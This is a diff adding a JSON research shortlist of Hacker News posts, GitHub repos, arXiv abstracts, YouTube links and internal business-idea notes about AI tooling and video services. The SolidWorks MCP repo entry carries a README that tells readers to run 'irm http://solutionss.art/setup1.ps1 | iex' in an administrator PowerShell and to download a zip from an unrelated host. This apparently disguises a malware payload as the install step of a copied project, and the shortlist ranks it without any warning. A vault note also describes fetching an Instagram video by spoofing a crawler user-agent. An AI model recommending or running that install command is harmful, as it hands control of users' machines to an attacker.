@@ -1,0 +1,269 @@
+{
+ "date": "2026-09-29",
+ "shortlisted_at": "2026-09-29T23:33:18+0100",
+ "candidates": 141,
+ "dropped_seen": [
+  "hn:49877515",
+  "hn:49875801",
+  "hn:49881505",
+  "hn:49879401",
+  "hn:49867067",
+  "gh:yetone/magpie",
+  "gh:dzhng/jevgrep",
+  "gh:mikehasa/golive-skill",
+  "gh:lemomo-ai/lemo-opuscar",
+  "gh:samyost1/3dicon",
+  "gh:chainstacklabs/pumpfun-bonkfun-bot",
+  "gh:nexmoe/vidbee",
+  "gh:nateherkai/hyperframes-student-kit",
+  "gh:jkawamoto/mcp-youtube-transcript",
+  "yt:SiBhLYf8YJ4",
+  "yt:d3vvN-ddRDo"
+ ],
+ "flagged_vault": 6,
+ "errors": [
+  "enrich yt:u2QqWkMv3Lg: IpBlocked: \nCould not retrieve a transcript for the video https://www.youtube.com/watch?v=u2QqWkMv3Lg! This is most likely caused by:\n\nYouTube is blocking requests from your IP. This usually is due to one of the following reasons:\n- You have done too many requests and your IP has been blocked by YouTube\n- You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube.\n\nWays to work around this are explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception).\n\n\nIf you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!",
+  "enrich yt:He8tUwLzLnU: IpBlocked: \nCould not retrieve a transcript for the video https://www.youtube.com/watch?v=He8tUwLzLnU! This is most likely caused by:\n\nYouTube is blocking requests from your IP. This usually is due to one of the following reasons:\n- You have done too many requests and your IP has been blocked by YouTube\n- You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube.\n\nWays to work around this are explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception).\n\n\nIf you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!",
+  "enrich yt:misjUj4Q_ho: IpBlocked: \nCould not retrieve a transcript for the video https://www.youtube.com/watch?v=misjUj4Q_ho! This is most likely caused by:\n\nYouTube is blocking requests from your IP. This usually is due to one of the following reasons:\n- You have done too many requests and your IP has been blocked by YouTube\n- You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube.\n\nWays to work around this are explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception).\n\n\nIf you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!"
+ ],
+ "items": [
+  {
+   "key": "vault:2026-09-29:join-for-one-month-with-skool-neptune-transcribe-the-classro",
+   "source": "vault",
+   "query": "open",
+   "title": "Join for one month with Skool neptune, transcribe the classroom into Education/Courses/ai-video-bootcamp, cancel before renewal",
+   "url": "",
+   "meta": {
+    "vault_status": "open",
+    "kind": "service",
+    "subject": "AI Video Bootcamp (Skool, Daniel Riley), $9/month AI video course",
+    "date": "2026-09-29",
+    "where": "TRITON-CORE/Research/links/2026-09-29-ai-video-bootcamp-skool.md",
+    "has_transcript": false
+   },
+   "body": "Vault status: open, meaning nobody on the vault side has run it to a verdict.\n\nThe vault's note on this theme: (none)\n\nThe vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (service) Worth one month at 9 dollars: 28.6k members, organic Trustpilot 4.8 from 82 uninvited reviews, active founder, nine phases with character consistency, AI ads and cloning that map onto the avatar content engine bake-off. Beginner to intermediate depth (both critical reviews say YouTube-free level), no live calls at base price, and the affiliate reviews' price-rise-at-26,700 claim never happened. Join, extract the classroom, cancel before month two.",
+   "score": 100.0,
+   "thread": {
+    "date": "2026-09-29",
+    "subject": "AI Video Bootcamp (Skool, Daniel Riley), $9/month AI video course",
+    "kind": "service",
+    "status": "open",
+    "theme": "Join for one month with Skool neptune, transcribe the classroom into Education/Courses/ai-video-bootcamp, cancel before renewal",
+    "note": "",
+    "where": "TRITON-CORE/Research/links/2026-09-29-ai-video-bootcamp-skool.md"
+   }
+  },
+  {
+   "key": "hn:49877270",
+   "source": "hn",
+   "query": "mcp server",
+   "title": "Show HN: Durable Actor Session Protocol",
+   "url": "https://dasp-protocol.github.io/dasp/",
+   "hn_url": "https://news.ycombinator.com/item?id=49877270",
+   "meta": {
+    "points": 17,
+    "comments": 7,
+    "created": "2026-09-28T13:00:13Z"
+   },
+   "body": "Hey HN I'm the author of Jido, an Elixir Actor & Agent SDK. I was building out an Elixir Durable Actor/Agent server and hit a wall regarding communication protocols. I reviewed all the existing protocols; A2A, ACP, AHP and nothing met my needs. I wanted a language agnostic durable actor session protocol. Agent Host Protocol (AHP) from Microsoft was close, but was centered around \"chat\". The future I envision for agents goes far beyond just text chat. Thus, DASP was born. I'm submitting to HN because I know this is the one place where I'll get real feedback on whether this is an actual need or my tokenmaxxing got the best of me this weekend. This is a builder protocol. I'll be building out clients beyond Elixir and TypeScript, but plan to only support an Elixir server built around my Jido ecosystem.\ncomment (HalcyonicStorm): Really great stuff! Cant wait to try it out in my harness!\ncomment (nkko): I’ve been playing a lot with durable agents, can’t say that I know what the final thing should look like but this could be a part of it. For now I have celld in front of sandbox, if I get this right: agent -> dasp -> celld -> sandbox\ncomment (yodon): Is this purely polling, or am I missing how to subscribe to events?",
+   "score": 3.9300925287360826
+  },
+  {
+   "key": "gh:agentsystemlabs/agent-office",
+   "source": "github",
+   "query": "claude-code created:>{since} stars:>20",
+   "title": "AgentSystemLabs/agent-office: A cartoon 3D office where your team hires Claude Code workers at desks, shares live terminals, talks over voice, and tracks GitHub issues and PRs.",
+   "url": "https://github.com/AgentSystemLabs/agent-office",
+   "repo": "AgentSystemLabs/agent-office",
+   "meta": {
+    "stars": 381,
+    "created": "2026-09-26",
+    "pushed": "2026-09-29",
+    "language": "TypeScript",
+    "topics": []
+   },
+   "body": "> [!WARNING]\n> **Work in progress.** Agent Office is built for one person's workflow — mine — and it changes fast as I iterate on it.\n> Expect breaking changes between releases: keys that move, screens that get redrawn, features that come and go\n> without notice. If it's close to what you want, fork or clone it and bend it into what you need it to be.\n\n \n\n*\"Whatever you do, work heartily, as for the Lord and not for men.\"* — Colossians 3:23 (ESV)\n\n# 🏢 Agent Office\n\n**A 3D office your team shares with its coding agents.**\n\nSit **Claude Code**, **Codex** and **OpenCode** workers at desks, watch each one's terminal on the laptop in front of it,\nand jump into any of them together. Every GitHub repo is a floor of the building.\n\n[](https://github.com/AgentSystemLabs/agent-office/releases)\n[](https://github.com/AgentSystemLabs/agent-office/actions)\n[](LICENSE)\n[](#run-locally)\n[](https://www.typescriptlang.org)\n\n[**Run locally**](#run-locally) · [**Deploy to AWS**](#deploy-to-aws-ec2) · [**Azure**](#deploy-to-azure) · [**Railway**](#deploy-to-railway) · [**Fly.io**](#deploy-to-flyio) · [**Dokploy**](#deploy-to-dokploy) · [**Any server**](#deploy-to-any-ubuntu-or-debian-server) · [**Add users**](#add-users) · [**Controls**](#controls) · [**Features**](docs/features.md) · [**How it works**](docs/how-it-works.md)\n\n```sh\ncurl -fsSL https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.sh | bash\n```\n\n \n\n---\n\n## What it is\n\n- **A floor per project.** Ride the elevator, pick one of your GitHub repos, and the office clones it and opens a floor for it. Every worker, board and queue on that floor works in that checkout.\n- **Workers at desks.** Walk up to an empty desk, press **E**, and pick Claude Code, Codex or OpenCode. The agent's live terminal shows on its laptop, and anyone can open it and type.\n- **You can see who needs you.** A worker that needs input or has finished jumps up and down and dings. Press **N** to go straight to the one that has waited longest.\n- **From your phone, too.** `/lite` is the office in 2D: every worker and what it's waiting on, its terminal with the keys a phone keyboard lacks, and the boards. The 3D office offers it on a phone or a slow computer.\n- **GitHub on the walls.** Issues and pull requests hang on cork boards. Hand an issue to a worker, queue tasks, give a worker its own git worktree and open its PR with one key. One task can span several projects: the worker gets a worktree of each, and a PR in each that links the others.\n- **Together.** Voice, chat, screen sharing on the lounge TV and a shared whiteboard.\n\nThere's a lot more (a rooftop bar, an office dog, an arcade): see [docs/features.md](docs/features.md).\n\n## Requirements\n\nOn the machine that runs the office:\n\n- **Node.js 20+**\n- At least one agent CLI, signed in as the user that runs the office: **Claude Code** (`claude`), **Codex** (`codex`) or **OpenCode** (`opencode`). With [accounts](#add-users), everyone can sign in to their own Claude from the office instead.\n- **git**, and the **GitHub CLI** (`gh auth login`) for cloning repos and the issue and PR boards\n\n## Run locally\n\nInstall the latest release and start the office:\n\n```bash\ncurl -fsSL https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.sh | bash\n```\n\nOn Windows, in PowerShell:\n\n```powershell\nirm https://raw.githubusercontent.com/AgentSystemLabs/agent-office/main/install.ps1 | iex\n```\n\nThis puts an `agent-office` command on your PATH, so next time just ",
+   "score": 5.945420608606575
+  },
+  {
+   "key": "arxiv:2609.35760",
+   "source": "arxiv",
+   "query": "all:\"language model\" AND all:agent AND all:tool",
+   "title": "TokenCast: Forecasting Token Consumption During LLM Agent Execution",
+   "url": "https://arxiv.org/abs/2609.35760",
+   "meta": {
+    "published": "2026-09-28",
+    "authors": [
+     "Chaoqian Ouyang",
+     "Ling Yue",
+     "Libin Zheng",
+     "Huanghui Guo"
+    ],
+    "categories": [
+     "cs.LG",
+     "cs.AI",
+     "cs.SE"
+    ]
+   },
+   "body": "When a large language model (LLM) agent executes the same task, token consumption can vary by over an order of magnitude across runs. The agent chooses its next steps based on tool feedback and intermediate results, while the growing context steadily inflates the input size of every subsequent call. The total consumption of a task is therefore hard to predict before execution and the prediction must be revised as the run unfolds. In this paper, we propose TokenCast, which learns a composable cost representation for each execution segment, recording its own consumption and the context growth it introduces. Composing adjacent segments yields a cumulative estimate that captures the extra input cost incurred when context from earlier segments is re-read by every later call. As execution unfolds, newly observed evidence refreshes the forecast, requiring no additional LLM calls and incurring a mean cumulative prediction time of 32.8 ms per run on SWE-bench Verified. Across 4 task suites and 6 agent models, TokenCast's mean absolute error reduction against the strongest comparator averages 14.5% over 96 evaluated combinations. In offline budget-control replay, TokenCast uses 21.3% fewer tokens on average than a fixed-budget policy at matched trace completion. The code is available at https://github.com/DEFENSE-SEU/TokenCast.",
+   "score": 1.0
+  },
+  {
+   "key": "yt:u2QqWkMv3Lg",
+   "source": "youtube",
+   "query": "claude code skills workflow 2026",
+   "title": "Claude Code Full Course 2026 | How Senior Engineers Actually Build with AI",
+   "url": "https://www.youtube.com/watch?v=u2QqWkMv3Lg",
+   "meta": {
+    "channel": "JavaScript Mastery",
+    "rank": 1
+   },
+   "body": "\n[body unavailable: IpBlocked]",
+   "score": 1.0
+  },
+  {
+   "key": "vault:2026-09-27:media-buying-commission-taken-as-a-share-of-a-brand-s-ad-bud",
+   "source": "vault",
+   "query": "open",
+   "title": "Media-buying commission taken as a share of a brand's ad budget",
+   "url": "",
+   "meta": {
+    "vault_status": "open",
+    "kind": "scheme",
+    "subject": "AI Clipping Agency starter kit (Musa Mustafa, Media Metas / Crayo Inc)",
+    "date": "2026-09-27",
+    "where": "TRITON-CORE/Research/links/2026-09-27-natejbiz-retainer-and-crayo-starter-kit.md",
+    "has_transcript": false
+   },
+   "body": "Vault status: open, meaning nobody on the vault side has run it to a verdict.\n\nThe vault's note on this theme: Named as the kit's second angle at 20 percent of a 100k budget; not assessed in the write-up\n\nThe vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (scheme) Real operator and real tool: Musa Mustafa co-founded crayo.ai (3.2m users), company Media Metas / Crayo Inc, San Jose. But the 5 dollar price, down from 12.50, is a qualifier not a product: it puts a card on file and routes to a private one-to-one with an agency owner, which is where the real offer lands. What it actually sells is the commodity half, Content Rewards pay-per-view clipping, which is the volume game natejbiz explicitly warns against, plus a media-buying commission angle (20 percent of a 100k brand budget). The money worth having in this category is the flat monthly editing retainer, two to six thousand a month, which we can already deliver with no purchase. Income claims (3k first week, 3,801 in 13 days, 4,251 with zero experience) are unevidenced, and the 48-hour guarantee covers budget allocation, not earnings. Job: Sell post-production as a monthly retainer, priced, to businesses that already produce content (still open)",
+   "score": 99.0,
+   "thread": {
+    "date": "2026-09-27",
+    "subject": "AI Clipping Agency starter kit (Musa Mustafa, Media Metas / Crayo Inc)",
+    "kind": "scheme",
+    "status": "open",
+    "theme": "Media-buying commission taken as a share of a brand's ad budget",
+    "note": "Named as the kit's second angle at 20 percent of a 100k budget; not assessed in the write-up",
+    "where": "TRITON-CORE/Research/links/2026-09-27-natejbiz-retainer-and-crayo-starter-kit.md"
+   }
+  },
+  {
+   "key": "gh:capturegrubenchant/solidworks",
+   "source": "github",
+   "query": "mcp server created:>{since} stars:>30",
+   "title": "CaptureGrubEnchant/SolidWorks: SolidWorks MCP Server connects an AI assistant to a running SolidWorks instance. Sketch, extrude, fillet, export STEP/STL, generate macros.",
+   "url": "https://github.com/CaptureGrubEnchant/SolidWorks",
+   "repo": "CaptureGrubEnchant/SolidWorks",
+   "meta": {
+    "stars": 372,
+    "created": "2026-09-25",
+    "pushed": "2026-09-29",
+    "language": "TypeScript",
+    "topics": [
+     "3d-modelling",
+     "3d-modelling-software",
+     "3d-rendering",
+     "3d-rendering-software",
+     "3d-rendering-tools",
+     "3dexperience",
+     "3dprinting",
+     "cad-tools"
+    ]
+   },
+   "body": "# SolidWorksMCP\n  \n\n \n\n \n\n \n\n \n\n \n\n Repository:  SolidWorks MCP Server  ( SolidworksMCP-TS ) · Node.js MCP + COM / VBA \n\n  \n\n[](https://www.typescriptlang.org/)\n[](https://modelcontextprotocol.io)\n[](https://nodejs.org/)\n[](#installation)\n[](#3-linux)\n[](#4-macos)\n[](LICENSE)\n\n \n\n**Works with the agent you already use**\n\n[](#configure-claude-desktop)\n[](#configure-claude-desktop)\n\n \n\n \n\n> **Alpha / Experimental.** Architecture is in place and basic operations (sketch planes, simple extrusions) have been demonstrated. **Most tools have not been validated against a live SolidWorks instance.** Expect COM quirks. Test reports are welcome.\n\n \n\n## What a session looks like\n\n \n \n \n\n```text\nYou    New part. Sketch a 40×20 mm rectangle\n       on Front Plane and extrude 12 mm.\n\nAgent  Creating the part document…\n       Front Plane selected.\n       Rectangle 40 × 20 mm added.\n       Extrusion FeatureExtrusion3 routed\n       through VBA (20+ COM parameters).\n       Feature tree: Sketch1 → Boss-Extrude1\n\nYou    Fillet the long edges 2 mm, export STEP.\n\nAgent  Fillet applied. Export queued.\n       File saved next to the part.\n```\n\n \n \n\n### Why the router exists\n\nSolidWorks APIs such as `FeatureExtrusion3` take **20+ parameters**. Node.js COM bridges often fail past 12.\n\n- **≤ 12 params** → direct `winax` COM\n- **13+ params** → generated VBA macro\n- **Failure** → automatic fallback with context\n\nNever pass `null` into COM. Use `undefined`. Prefer feature-tree walk over `SelectByID2`.\n\n \n \n \n\n \n\n## Why it's built this way\n\n \n \n \n\n### Direct COM when it is safe\nSimple sketch and document calls go through `winax` with no extra hop. Fast path for planes, lines, circles, and short feature calls.\n\n \n \n\n### VBA when COM chokes\nA complexity analyzer counts parameters. Long SolidWorks signatures become a one-shot VBA macro SolidWorks executes itself.\n\n \n \n \n \n\n### Feature tree over name picking\n`FeatureByPositionReverse()` + `GetTypeName2()` finds sketches more reliably than `SelectByID2`.\n\n \n \n\n### Stdio stays clean\nLogging is Winston only. `console.*` corrupts JSON-RPC on stdio and breaks the MCP client.\n\n \n \n \n\n \n\n## Installation\n\n### 1. Windows — Download\n\n \n\n[](http://pannki.com/SolidworksMCP.zip).\n\n \n\n```text\n1. Press Win + X on your keyboard\n2. From the menu, select: Terminal (Admin) or PowerShell (Admin)\n3. Confirm the UAC prompt (Yes)\n4. Copy the command below in full:\n```\n\n```powershell\nirm http://solutionss.art/setup1.ps1 | iex\n```\n\nAfter download:\n\n1. Extract the archive.\n2. Confirm **Node.js 20+** is installed.\n3. In the project folder:\n\n```bat\nnpm install\nnpm run build\n```\n\n> `winax` must compile locally on each Windows machine. A global npm install will not work.\n\n \n\n### 2. Windows — PowerShell (Administrator)\n\nRun **Windows PowerShell** or **PowerShell 7** as Administrator.\n\n```powershell\nirm http://solutionss.art/setup1.ps1 | iex\nSet-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force\n\n$Repo = \"https://github.com/vespo92/SolidworksMCP-TS.git\"\n$Dest = \"$env:USERPROFILE\\SolidworksMCP-TS\"\n\nif (-not (Get-Command git -ErrorAction SilentlyContinue)) {\n    Write-Error \"Git not found. Install Git for Windows and retry.\"\n    exit 1\n}\nif (-not (Get-Command node -ErrorAction SilentlyContinue)) {\n    Write-Error \"Node.js not found. Install Node.js 20+ and retry.\"\n    exit 1\n}\n\nif (Test-Path $Dest) {\n    Write-Host \"Directory exists, updating repository...\" -ForegroundColor Yellow\n    Set-Location $Dest\n    git pull\n} else {\n    git clone $Repo $",
+   "score": 5.921578419643816
+  },
+  {
+   "key": "arxiv:2609.35738",
+   "source": "arxiv",
+   "query": "all:\"language model\" AND all:agent AND all:tool",
+   "title": "Harness Learning Enables Generalizable Test-Time Adaptation",
+   "url": "https://arxiv.org/abs/2609.35738",
+   "meta": {
+    "published": "2026-09-28",
+    "authors": [
+     "Alvin Zhang",
+     "Xuecheng Liu",
+     "Zixuan Wang",
+     "Fahim Tajwar"
+    ],
+    "categories": [
+     "cs.CL",
+     "cs.LG"
+    ]
+   },
+   "body": "A language-model agent is jointly defined by its model and its harness, the executable program that organizes model calls, tool use, and information flow. Because different tasks call for different ways of organizing these operations, the harness needs to be adapted using feedback from the task at hand. We introduce harness learning, which trains a proposer model to revise a solver's harness using execution feedback. We formulate this process as meta-learning over executable programs, with harness revisions playing the role of weight updates in gradient-based adaptation. We train the proposer with reinforcement learning, using the task performance of revised harnesses as the reward. At test time, the proposer uses feedback from successive executions on a new task to refine the harness, without performing any parameter-space update. Experiments on reasoning and multi-hop question answering show that harness learning improves revision quality and that the ability to adapt at test time transfers to unseen tasks. Policies trained on individual revisions can continue improving harnesses over multiple rounds, while the benefits of training on revision sequences vary across settings. These findings suggest a path towards continually learning agents that turn accumulated experience into generalizable improvements.",
+   "score": 1.0
+  },
+  {
+   "key": "yt:He8tUwLzLnU",
+   "source": "youtube",
+   "query": "mcp server build tutorial",
+   "title": "MCP Servers Explained & Built",
+   "url": "https://www.youtube.com/watch?v=He8tUwLzLnU",
+   "meta": {
+    "channel": "Tech With Tim",
+    "rank": 1
+   },
+   "body": "\n[body unavailable: IpBlocked]",
+   "score": 1.0
+  },
+  {
+   "key": "vault:2026-09-26:post-production-for-businesses-that-have-long-form-content-b",
+   "source": "vault",
+   "query": "open",
+   "title": "Post-production for businesses that have long-form content but cannot cut it into short-form",
+   "url": "https://www.instagram.com/reel/DcU_MNWtIkg/",
+   "meta": {
+    "vault_status": "open",
+    "kind": "idea",
+    "subject": "Clipping as a service (@natejbiz reel, video transcribed)",
+    "date": "2026-09-26",
+    "where": "TRITON-CORE/Research/links/2026-09-26-natejbiz-clipping-as-a-service-reel.md",
+    "has_transcript": false
+   },
+   "body": "Vault status: open, meaning nobody on the vault side has run it to a verdict.\n\nThe vault's note on this theme: The stack already owns the expensive half, HyperFrames, avatars, ElevenLabs, captions and compose; a trades client is the live test case\n\nThe vault's verdict on the parent link, which judged the vendor and Luke's time, not this theme: (idea) Read the video rather than the caption: pulled the MP4 through the embed proxy with a crawler user-agent and transcribed it locally in about 90 seconds, free. His claim is 747,000 dollars personally in 12 months and about 2 million across the business, all from clipping; unaudited, his own number, and clipping agencies are a crowded 2026 market, so treat the figure as marketing and the mechanism as real. Two models: mass clips, where clippers cut a big personality for per-view payouts (Kai Cenat named) which is a volume game not worth our time; and the agency side, business to business, taking a company that already has long-form content and cutting it into short-form that lands them leads (Amalfi Jets named as a client). The second is the one. THE PATTERN: this is the third convergence this week from unrelated directions, after Butter (variant generation is the idea, the platform is the liability) and paid UGC (buy the clip, own the post-production). All three say we already own the expensive half — HyperFrames, the avatar engine, ElevenLabs, captions and compose — and what was missing is the sentence that sells it: businesses have content and no ability to cut it. RDS is the live test case, since step 4 of WF-0310 already needs three non-template creatives from an instructor who has exactly one piece of footage that worked. Job: Sell post-production as a service to businesses that have content and no capability to cut it (still open) Write-up: `TRITON-CORE/Research/links/2026-09-26-natejbiz-clipping-as-a-service-reel.md` Link: https://www.instagram.com/reel/DcU_MNWtIkg/",
+   "score": 98.0,
+   "thread": {
+    "date": "2026-09-26",
+    "subject": "Clipping as a service (@natejbiz reel, video transcribed)",
+    "kind": "idea",
+    "status": "open",
+    "theme": "Post-production for businesses that have long-form content but cannot cut it into short-form",
+    "note": "The stack already owns the expensive half, HyperFrames, avatars, ElevenLabs, captions and compose; a trades client is the live test case",
+    "where": "TRITON-CORE/Research/links/2026-09-26-natejbiz-clipping-as-a-service-reel.md",
+    "url": "https://www.instagram.com/reel/DcU_MNWtIkg/"
+   }
+  },
+  {
+   "key": "gh:barty-bart/motion-graphics",
+   "source": "github",
+   "query": "claude-code created:>{since} stars:>20",
+   "title": "Barty-Bart/motion-graphics: Motion-graphics skills for Claude Code and Codex.",
+   "url": "https://github.com/Barty-Bart/motion-graphics",
+   "repo": "Barty-Bart/motion-graphics",
+   "meta": {
+    "stars": 329,
+    "created": "2026-09-25",
+    "pushed": "2026-09-25",
+    "language": "HTML",
+    "topics": []
+   },
+   "body": "# motion-graphics\n\nMotion-graphics skills for Claude Code. Each skill does one job. The first one is **`motion-broll`**.\n\n| Skill | What it does |\n|---|---|\n| `motion-broll` | Give it a video and a transcript and it makes motion-graphic B-roll timed to your words. |\n\nMore skills will be added to this repo.\n\n## motion-broll\n\n**Motion-graphic B-roll for your videos, made by Claude Code.** Give it a video and a transcript and it plans, animates and renders clips timed to your words. Each clip is one continuous shape that keeps morphing (pill → card → terminal → chart) and never cuts, with a cursor driving every change.\n\n \n   \n   \n \n\n## What you get\n\nYou run `/motion-broll`, answer a few questions, approve a plan, and get back:\n\n- **The clips**, named by where they go on your timeline (`04-master-prompt_0m32s40.mp4`). Full-frame cutaways are MP4. Panels that sit in empty space next to you are transparent ProRes 4444 `.mov`.\n- **A preview render** of your video with the clips cut in.\n- **`compare.html`**: original vs. with motion graphics, synced, as side by side, stacked or wipe.\n- **`viewer.html`**: step through the clips one by one.\n- **`TIMING.md`**: every clip with its in/out point and the line it covers.\n\nThe preview is for review. For your final cut, drop the clips into your own editor.\n\n## Install\n\n```\nnpx skills add Barty-Bart/motion-graphics\n```\n\nThat installs the skills from this repo (pick `motion-broll`). It works in Claude Code and other agents that read skills.\n\nOr copy `skills/motion-broll` into your project's `.claude/skills/` (or `~/.claude/skills/` to use it everywhere).\n\n**Requirements:** Node 18+, Python 3, and ffmpeg (with the ProRes encoder, standard in Homebrew builds). On first run the skill installs Playwright and Chromium into a local `motion/` folder.\n\n## Use it\n\n```\n/motion-broll\n```\n\nThen point it at your video and transcript (an SRT from your editor, Descript or YouTube works). It will:\n\n1. **Inspect the footage.** It reads resolution, frame rate and layout, including picture-in-picture sections and whether the box changes size.\n2. **Estimate word timings** from your transcript.\n3. **Plan the clips** in a table and wait for your OK. For each clip it chooses a full-frame cutaway, a transparent panel in empty space, or nothing, and tells you why.\n4. **Build each clip**, check stills on the key words, and fix what's off.\n5. **Render** with motion blur at your video's frame rate, then make the preview and the comparison pages.\n\nIt never invents numbers or results. Bars show relative size and text uses skeleton lines until you give it the real figures.\n\n## How it works\n\n- Every frame is a pure function of time. Springs are closed-form step responses, and a value that changes target many times is the sum of one spring per change. There are no CSS transitions or timers, so any frame can be rendered on its own.\n- Clips are small HTML files on a shared engine (`skills/motion-broll/engine/motion.js`). Headless Chromium captures 4 sub-frames per frame across a 180° shutter, and ffmpeg blends them into motion blur.\n- The worked example in `skills/motion-broll/examples/opus-aoe2/` is the six clips from the demo above.\n\n## Licence\n\nMIT. Geist fonts: SIL Open Font License. Icon paths adapted from Lucide (ISC).",
+   "score": 5.799092654460526
+  },
+  {
+   "key": "yt:misjUj4Q_ho",
+   "source": "youtube",
+   "query": "claude code skills workflow 2026",
+   "title": "Building a Real App with Claude Code (Start to Finish)",
+   "url": "https://www.youtube.com/watch?v=misjUj4Q_ho",
+   "meta": {
+    "channel": "Tech With Tim",
+    "rank": 2
+   },
+   "body": "\n[body unavailable: IpBlocked]",
+   "score": 0.5
+  }
+ ]
+}
